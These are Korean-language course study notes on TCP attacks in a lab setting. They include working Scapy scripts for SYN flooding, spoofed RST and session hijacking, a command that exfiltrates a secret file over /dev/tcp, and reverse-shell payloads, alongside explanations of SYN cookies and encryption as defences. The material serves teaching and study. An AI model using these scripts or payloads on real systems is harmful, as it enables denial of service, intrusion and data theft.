# Ch6. TCP and Attacks 정리

## 0. 배경: TCP를 이해하기 위한 최소 지식

- **TCP = 신뢰성 있는 byte stream**: 연결지향(virtual connection), 순서 보장, 신뢰성, 흐름제어 제공.
- **연결 식별 = 4-tuple**: `(src IP, src port, dst IP, dst port)`. 이 4개가 같아야 같은 연결.
- **Seq/Ack 번호**: sender는 보내는 byte에 sequence number를 매기고, receiver는 "다음에 기대하는 byte 번호"를 ACK로 알려줌(누적 ACK). 데이터 1 byte = seq 1 증가.
- **TCP Header 주요 필드**: Source/Destination port, Sequence number, Acknowledgment number, 플래그(URG/ACK/PSH/RST/SYN/FIN), Window size, Checksum.
- **버퍼**: 송신측 Send Buffer, 수신측 Receive Buffer가 있고 데이터는 stream으로 흘러감.

---

## 1. TCP Question 1, 2 — 결과와 그 이유

### Question 1 (p.11)
```c
// 한쪽(보내는 쪽)
write(sockfd, "Hello World.",     size1);
write(sockfd, "Hello Universe.",  size2);
// 반대쪽(받는 쪽)
read(sockfd, buffer, ...);
read(sockfd, buffer, ...);
```

**결과**
- **TCP**: 두 번의 `write`와 두 번의 `read`가 1:1로 대응된다는 보장이 **없다**. 첫 `read`가 `"Hello World.Hello Un"` 처럼 두 메시지가 **합쳐지거나 잘려서** 올 수 있다.
- **UDP**: 한 번의 send = 한 개의 datagram, 한 번의 recv = 한 개의 datagram. 메시지 **경계가 그대로 보존**되어 첫 read는 `"Hello World."`, 둘째 read는 `"Hello Universe."`.

**이유**
- TCP는 **byte stream** 프로토콜이다. application이 나눠 쓴 단위(write 경계)를 TCP가 보존하지 않고, 버퍼에 쌓인 byte들을 세그먼트 사정에 맞춰 합치거나(Nagle 등) 쪼개서 전송한다 → **메시지 경계 없음**.
- UDP는 **datagram(메시지) 지향**이라 각 datagram이 독립적으로 전달되어 경계가 유지된다(단, buffer보다 큰 datagram은 잘림).

### Question 2 (p.12)
> 같은 머신의 두 프로그램(App1, App2)이 다른 머신의 **같은** 서버로 데이터를 보내면 서버가 데이터를 섞는가? UDP면?

**결과 / 이유**
- **TCP**: 섞이지 **않는다**. App1과 App2는 **source port가 서로 다르므로** 서버 입장에서 4-tuple이 다른 **별개의 연결**이다. 서버는 `accept()`로 각각 별도의 socket·버퍼를 만들어 처리한다.
- **UDP**: 서버는 보통 **하나의 socket**으로 모든 클라이언트의 datagram을 받는다. 두 프로그램의 datagram이 **같은 수신 큐에 섞여서** 들어온다. 누가 보낸 것인지는 `recvfrom()`이 돌려주는 source 주소로만 구분 가능하다(개별 datagram 경계 자체는 유지).

> 핵심: **TCP = 연결(4-tuple)로 demultiplex / byte stream**, **UDP = 단일 socket / datagram**.

---

## 2. SYN Flooding Attack

### 2-1. 어떤 취약점을 노리는가
- 3-way handshake에서 서버는 SYN을 받으면 **SYN+ACK를 보내고 연결 상태를 "half-open"으로 저장**한다. 이 half-open 항목은 **SYN queue(backlog)** 라는 **유한한** 자료구조에 들어간다.
- 공격자는 **위조된(존재하지 않는/도달 불가능한) source IP**로 SYN을 대량 전송한다. 서버는 각 SYN마다 SYN+ACK를 보내고 half-open 항목을 만든 뒤, **마지막 ACK를 기다리며 대기**한다.
- 위조 IP는 ACK를 보내주지 않으므로 half-open 항목이 timeout까지 큐를 점유한다 → **SYN queue 고갈** → 정상 사용자의 SYN이 들어갈 자리가 없어 **연결 불가(DoS)**.

### 2-2. 진행 방식 (Scapy 코드, p.21)
```python
#!/bin/env python3
from scapy.all import IP, TCP, send
from ipaddress import IPv4Address
from random import getrandbits

ip  = IP(dst="10.9.0.5")          # 표적 서버
tcp = TCP(dport=23, flags='S')     # 23(telnet) 포트로 SYN
pkt = ip/tcp
while True:
    pkt[IP].src    = str(IPv4Address(getrandbits(32)))  # 랜덤 src IP (위조)
    pkt[TCP].sport = getrandbits(16)                    # 랜덤 src port
    pkt[TCP].seq   = getrandbits(32)                    # 랜덤 seq
    send(pkt, verbose=0)
```
- `flags='S'` : SYN 패킷.
- **매 패킷마다 src IP / src port / seq를 무작위화** → 서버 입장에서 전부 다른 연결로 보여 half-open 항목이 계속 쌓임. (도구 대안: `sudo netwox 76 -i 10.0.2.7 -p 23`)

### 2-3. Local(실습) 환경에서 공격이 실패하는 이유 & 대응 (p.22–24)

| # | 실패 원인 | 설명 | 성공시키려면(실습) |
|---|-----------|------|--------------------|
| 1 | **VirtualBox / 도달 가능한 위조 IP** | VM 환경에서 위조한 source IP가 실제로 도달 가능하면, 그 호스트가 예상 못한 SYN+ACK를 받고 **RST로 응답** → half-open 항목이 즉시 제거되어 큐가 안 참 | **컨테이너 사용** 또는 **존재하지 않는 랜덤 IP** 사용 |
| 2 | **SYN cookie 기본 ON** | `net.ipv4.tcp_syncookies=1`이면 큐가 차도 cookie로 처리 → 고갈 안 됨 | `sysctl -w net.ipv4.tcp_syncookies=0` |
| 2 | **SYN 큐가 큼 / Scapy가 느림** | `tcp_max_syn_backlog=512` 처럼 큐가 크면, Python+Scapy의 느린 전송 속도로는 **재전송·timeout 회수보다 빠르게 채우기 어려움** | backlog를 줄이거나 **C/netwox** 등 빠른 도구 사용 |
| 2 | **SYN+ACK 재전송** | `tcp_synack_retries=5` → 서버가 half-open을 일정 시간 유지·재전송하는 동작 자체는 공격에 유리하지만 타이밍 변수 | (참고용) |
| 3 | **TCP 캐시(tcp_metrics)** | 서버가 과거에 정상 연결했던 클라이언트 정보를 캐싱 → 그 클라이언트는 큐가 차도 연결되어 "공격 실패"처럼 보임 | `ip tcp_metrics flush` 로 캐시 비움 (`ip tcp_metrics show`로 확인) |

### 2-4. SYN Cookie 방어 메커니즘 (p.25)
- **핵심: 연결을 "stateless"하게 처리** = SYN을 받아도 **메모리(half-open 항목)를 할당하지 않는다.**
- 동작:
  1. SYN 수신 시, 서버는 상태를 저장하지 않고 **연결 정보(4-tuple, MSS, 시각, 비밀키)를 해시한 값을 SYN+ACK의 초기 sequence number(ISN, "cookie")에 인코딩**해서 보낸 뒤 잊어버린다.
  2. 정상 클라이언트는 handshake 마지막 ACK에서 `ack = cookie + 1`을 돌려준다.
  3. 서버는 ACK의 `ack-1`을 받아 **4-tuple로 cookie를 재계산**하여 일치하면 그제서야 연결을 복원하고 accept queue로 올린다.
- **왜 막히나**: half-open 상태를 **전혀 저장하지 않으므로 SYN queue를 고갈시킬 대상 자체가 없다.** 또한 공격자는 위조 IP를 썼기 때문에 SYN+ACK(=cookie)를 받지 못해 **유효한 마지막 ACK를 위조할 수 없다** → 연결 완성 불가.

---

## 3. TCP Reset(RST) Attack

### 3-1. RST의 동작 (p.28–29)
- TCP는 정상 종료(4-way FIN) 외에, **RST 플래그**로 연결을 **즉시 강제 종료**할 수 있다.
- 어떤 호스트가 **자신의 연결(4-tuple 일치)에 해당하고 sequence number가 수신 윈도 안에 있는** RST 패킷을 받으면, 그 연결을 바로 닫는다.

### 3-2. 공격이 가능한 이유
- TCP 패킷에는 **인증/암호화가 없다.** 패킷이 "정당한 상대"가 보낸 것인지 검증하지 못한다.
- 같은 네트워크에서 **sniffing**하면 공격자는 연결의 **4-tuple과 현재 sequence/ack 번호를 그대로 알 수 있다.**
- 따라서 올바른 4-tuple + 윈도 안의 seq + RST 플래그를 가진 패킷을 **위조(spoof)** 하면 피해자는 정상 패킷으로 받아들여 **연결을 끊는다.**

### 3-3. Question — 어떤 header field를 조작해야 하는가 (p.31–34)
A와 B 사이 연결을 끊으려고 RST를 위조할 때 **성공에 결정적인 필드**:

- **IP header**: `Source IP`(가장할 송신자), `Destination IP`(받는 쪽)
- **TCP header**: `Source port`, `Destination port` (→ 4-tuple 일치), **`Sequence number`(수신 윈도 안, 보통 다음 기대 seq)**, **`RST` 플래그**

즉 **4-tuple + sequence number + RST 플래그**. (Sample code, p.34)
```python
from scapy.all import *
def spoof(pkt):
    old_tcp = pkt[TCP]; old_ip = pkt[IP]
    ip  = IP(src=old_ip.dst,  dst=old_ip.src)                 # 방향 반대로
    tcp = TCP(sport=old_tcp.dport, dport=old_tcp.sport,
              flags="R", seq=old_tcp.ack)                     # ★ seq = 잡은 패킷의 ack
    send(ip/tcp/(""), verbose=0)
myFilter = 'tcp and src host 10.0.2.6 and dst host 10.0.2.7' + ' and src port 23'
sniff(iface='br-07950545de5e', filter=myFilter, prn=spoof)
```
- **포인트**: 위조 RST의 `seq`를 **sniff한 패킷의 `ack` 값**으로 설정한다. 한 방향의 ack 번호 = 반대 방향의 "다음 기대 sequence 번호"이므로 윈도 안에 정확히 들어가 RST가 수락된다. src/dst와 port를 swap해 끊으려는 방향으로 보낸다.

---

## 4. TCP Session Hijacking Attack

### 4-1. 개념 (p.36–37)
- 이미 인증된 연결(예: telnet) 중간에 공격자가 **위조 패킷(ACK + 데이터)** 을 끼워넣어 **피해자(클라이언트)인 척 서버에 명령을 주입**한다.
- 위조 패킷은 연결의 4-tuple과 **올바른 seq/ack**를 가져야 서버가 수락한다(같은 네트워크에서 sniff로 획득).

### 4-2. About Sequence Number — TCP 성질로 성공 확률을 높이는 법 (p.38–39)
- 수신 버퍼 상태(p.38): `~x` = 이미 도착, `x+1` = 다음 기대 byte, `x+δ` = 주입 데이터 위치.
- **TCP 성질**: 수신측은 **seq가 "수신 윈도(receive window)" 범위 안**에 있으면 데이터를 받아들인다(정확히 다음 byte가 아니어도 됨). 즉 **허용되는 seq 값의 범위(window)** 가 존재한다.
- 성공 확률을 높이기 위해 한 것:
  1. **Sniffing으로 현재 seq/ack를 정확히 알아낸다** → 추측이 아니라 정확한 값 사용.
  2. 주입 패킷의 `seq`를 **다음 기대 sequence number**로 맞춘다(δ를 0 근처로). 윈도 맨 앞이라 즉시 수락.
  3. 자동화(p.41)에서는 **`seq = (sniff한 seq) + (TCP 데이터 길이)`** 로 다음 기대값을 계산. (데이터 byte 수만큼 seq가 증가한다는 TCP 성질 이용)
- **Finding Sequence Number (p.39)**: Wireshark에서
  - *With Next Sequence Number*: `[Next sequence number]` 필드를 그대로 사용.
  - *Without*: `Sequence number + [TCP Segment Len](Data length)` 로 직접 계산.

### 4-3. 모든 코드 해석

**(A) Manual Spoofing (p.40)**
```python
#!/bin/env python3
import sys
from scapy.all import *

print("SENDING SESSION HIJACKING PACKET.........")
IPLayer  = IP(src="10.0.2.68", dst="10.0.2.69")          # 클라이언트→서버로 가장
TCPLayer = TCP(sport=37602, dport=23, flags="A",          # 4-tuple 일치, ACK 세팅
               seq=3716914652, ack=123106077)             # sniff로 얻은 정확한 값
Data = "\r cat /home/seed/secret > /dev/tcp/10.0.2.1/9090 \r"  # 주입 명령
pkt = IPLayer/TCPLayer/Data
ls(pkt)
send(pkt, verbose=0)
```
- `src/dst`= 클라이언트(10.0.2.68)→서버(10.0.2.69)로 **클라이언트인 척**.
- `sport=37602, dport=23` : 진행 중인 telnet 연결의 포트와 일치.
- `flags="A"` : 연결이 established 상태이므로 데이터 패킷은 ACK 플래그를 가진다.
- `seq=...` : **다음 기대 sequence number**(sniff) → 서버가 데이터를 수락.
- `Data` : 서버에서 실행될 명령. `secret` 파일을 공격자(10.0.2.1:9090)로 **TCP redirection으로 유출**. 앞뒤 `\r`로 명령 실행 보장.
- 결과: 공격자의 `nc -lnv 9090`에 `This is top secret!`(파일 내용)이 도착.

**(B) Automatic Spoofing (sniff-and-spoof, p.41)**
```python
def spoof(pkt):
    old_ip  = pkt[IP]
    old_tcp = pkt[TCP]
    # TCP 데이터 길이 = 전체 IP 길이 - IP 헤더 - TCP 헤더
    tcp_len = old_ip.len - old_ip.ihl*4 - old_tcp.dataofs*4
    ip  = IP( src = old_ip.src,  dst = old_ip.dst )       # 잡은 패킷과 같은 방향(클→서버)
    tcp = TCP( sport = old_tcp.sport, dport = old_tcp.dport, flags = "A",
               seq = old_tcp.seq + tcp_len,               # ★ 다음 기대 seq = seq + 데이터길이
               ack = old_tcp.ack )
    data = "\ntouch /tmp/success\n"                       # 주입 명령
    pkt = ip/tcp/data
    send(pkt, verbose=0)
    quit()
# (클라이언트→서버) 패킷을 sniff하여 콜백 호출
f = 'tcp and src host 10.0.2.68 and dst host 10.0.2.69'
sniff(filter=f, prn=spoof)
```
- `tcp_len` : `IP total length − IP헤더(ihl×4) − TCP헤더(dataofs×4)` = 순수 데이터 byte 수.
- `seq = old_tcp.seq + tcp_len` : 방금 본 패킷 다음에 올 byte 번호 → 정확히 윈도 맨 앞 → 수락. (수동에서 직접 적던 seq를 **자동 계산**)
- `flags="A"`, 4-tuple은 잡은 패킷 그대로 → 클라이언트인 척 서버에 주입.
- `quit()` : 한 번 주입 후 종료.

### 4-4. 42쪽 상황 설명 — "What Happens to The Session?" (p.42)
구성: User(10.0.2.68) ↔ Server(10.0.2.69), Attacker(10.0.2.70). 처음엔 User쪽 기대 seq = x, Server쪽 기대 seq = y.

1. 공격자가 **서버에** `Seq=x, Payload=8 (내용 "rm -f *\n")` 주입 → 서버는 이 8 byte를 정상 데이터로 받아들이고 **다음 기대 seq를 x+8로 전진**.
2. 서버는 User에게 `Seq=y, Ack=x+8, Payload=10` 으로 응답. 그러나 **User는 자신이 보낸 적 없는 8 byte를 ack 당함** → User 입장에서 **Ack 번호가 잘못됨(invalid Ack)** → 이 패킷들을 **drop**.
3. 이후 User가 정상적으로 `Seq=x, Payload=1` 을 보내면, **서버는 이미 x+8을 기대**하므로 이 seq=x는 **이미 받은 옛 데이터(중복)** 로 보고 **drop**.
4. 결과: **클라이언트와 서버의 seq/ack가 어긋나(desynchronization) 서로의 패킷을 계속 버린다.** Wireshark에는 `TCP Dup ACK`, `TCP Spurious Retransmission`, `TCP ACKed unseen segment`가 반복 → **ACK storm**. 정상 사용자의 세션은 **사실상 멈추거나 끊긴다.**

> 요약: hijacking으로 데이터를 한 번 주입하면 양쪽 seq가 틀어져 **원래 세션은 망가지고**(그래서 Mitnick류 공격은 이후 클라이언트를 끊거나, 공격자가 명령 한 줄을 주입하는 데 집중).

### 4-5. Reverse Shell vs Remote Shell, 그리고 주입 payload

**무엇을 주입할까 (p.44)**: 표적에서 shell(`/bin/bash`)을 실행 + 입출력 장치를 공격자에게 연결 = **Reverse Shell**.

**File Descriptor 배경 (p.45–48)**: 프로세스는 `0=stdin, 1=stdout, 2=stderr`. `/proc/$$/fd`를 보면 보통 셋 다 터미널(`/dev/pts/N`)을 가리킨다. **I/O redirection**으로 이 fd들을 다른 곳(파일/소켓)으로 돌릴 수 있다. bash의 특수 장치 `/dev/tcp/<ip>/<port>`는 실제 파일이 아니라 **bash가 해당 주소로 TCP 연결을 만들어주는 가상 장치**다(`cat > /dev/tcp/...` 하면 표준출력이 소켓으로 감).

**Reverse Shell payload (p.50–52)**
```bash
/bin/bash -i > /dev/tcp/<ip>/<port> 0<&1 2>&1
```
- `/bin/bash -i` : interactive shell 실행.
- `> /dev/tcp/<ip>/<port>` : **stdout(fd 1)** 을 공격자 IP:port로의 **TCP 연결**로 redirect → shell의 출력이 공격자에게 감.
- `0<&1` : **stdin(fd 0)** 을 fd 1(=TCP 소켓)로 redirect → shell의 입력을 **소켓에서** 받음(공격자가 타이핑한 명령이 들어옴).
- `2>&1` : **stderr(fd 2)** 도 fd 1(소켓)로 redirect → 에러 메시지도 공격자에게.
- 결과: 표적 shell의 입·출력·에러가 **모두 공격자와의 TCP 연결에 묶임** → 공격자는 `nc -lnv 9090`으로 받기만 하면 `Got a reverse shell!`.

세션 하이재킹에서 실제 주입한 데이터(p.51):
```python
data = "\n/bin/bash -i >/dev/tcp/10.9.0.1/9090 0<&1 2>&1\n"
```
앞뒤 `\n`은 주입한 명령줄이 **즉시 실행**되도록 보장한다.

서버가 bash가 아닐 때(p.52):
```bash
/bin/bash -c "/bin/bash -i > /dev/tcp/server_ip/9090 0<&1 2>&1"
```
명시적으로 bash를 호출해 안에서 reverse shell을 실행.

**왜 reverse shell인가? (Remote/Bind shell과의 차이)**

| 구분 | Remote(Bind) Shell | Reverse Shell |
|------|--------------------|---------------|
| 연결 방향 | **공격자 → 피해자** (inbound) | **피해자 → 공격자** (outbound) |
| Listen 하는 쪽 | 피해자가 포트 listen | 공격자가 포트 listen(`nc -lnv`) |
| 방화벽/NAT | 피해자 inbound 차단 시 **실패** | outbound는 보통 허용 → **우회 성공** |
| 적합 상황 | 피해자가 서비스 노출 | 명령 한 줄만 주입 가능한 경우(hijacking) — 피해자가 스스로 걸어오게 함 |

- **Remote shell(rsh)**: BSD r-command(p.57). `rsh 10.0.2.6 date`는 **두 개의 TCP 연결(포트 514)** 을 쓰며, 공격자가 표적에 **접속**해 명령 실행. IP 기반 신뢰(`.rhosts`)를 악용 → **Mitnick 공격**(신뢰 호스트를 SYN flooding으로 침묵시키고, sequence number를 예측해 그 호스트로 IP-spoofing하여 인증 없이 rsh 명령 실행)의 핵심.
- **차이의 본질**: remote/bind는 "공격자가 들어가는" 방식, reverse는 "피해자가 나오게 하는" 방식. 방화벽 환경과 주입 가능한 형태 때문에 hijacking에서는 reverse shell이 유리.

---

## 5. 참고: Mitnick Attack & Countermeasures
- **Mitnick(1994–95)**: SYN flooding(신뢰 호스트 침묵) + sequence number 예측 + IP spoofing으로 rsh 신뢰관계를 악용한 session hijacking의 실제 사례.
- **대응 (p.66–67)**: 본질적으로 TCP에 인증·기밀성이 없는 게 문제 → **암호화(encryption)** 가 근본 방어. 패킷을 암호화하면 sniff해도 seq/데이터를 알 수 없고(hijacking·sniff 방어), 무결성 검증으로 위조 RST·데이터 주입을 막는다. (예: SSH가 telnet/rsh를 대체)

### 한 줄 요약
TCP 공격은 모두 **인증/암호화 부재 + sniff로 4-tuple·seq 노출**에서 비롯된다. SYN flooding은 half-open 큐 고갈(→SYN cookie로 stateless 방어), RST/hijacking은 seq를 맞춘 위조 패킷(→암호화로 방어), reverse shell은 fd redirection으로 표적 shell을 공격자에게 연결한다.
